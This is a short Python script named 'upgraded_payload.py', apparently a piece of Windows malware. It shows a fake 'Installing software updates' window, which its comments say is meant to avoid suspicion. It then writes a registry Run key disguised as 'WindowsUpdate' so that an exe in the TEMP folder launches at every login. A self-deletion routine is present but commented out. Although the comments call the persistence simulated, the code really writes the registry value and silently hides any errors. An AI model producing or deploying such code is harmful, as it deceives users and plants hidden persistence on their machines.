# upgraded_payload.py
import os
import sys
import tkinter as tk
import winreg  # For Windows registry persistence

def add_to_startup():
    # Add payload to startup (simulate persistence)
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            payload_path = os.path.join(os.environ["TEMP"], "harmless_payload.exe")
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
    except Exception as e:
        pass

def show_fake_message():
    # Display a fake "installation" window to avoid suspicion
    root = tk.Tk()
    root.title("Software Installer")
    label = tk.Label(root, text="Installing software updates...", padx=20, pady=20)
    label.pack()
    root.after(3000, root.destroy)  # Close after 3 seconds
    root.mainloop()

#def self_destruct():
    # Delete the payload after execution
    #try:
    #    os.remove(sys.argv[0])
    #except Exception as e:
    # pass

if __name__ == "__main__":
    show_fake_message()
    add_to_startup()  # Simulate persistence
    #self_destruct()    # Delete the payload after running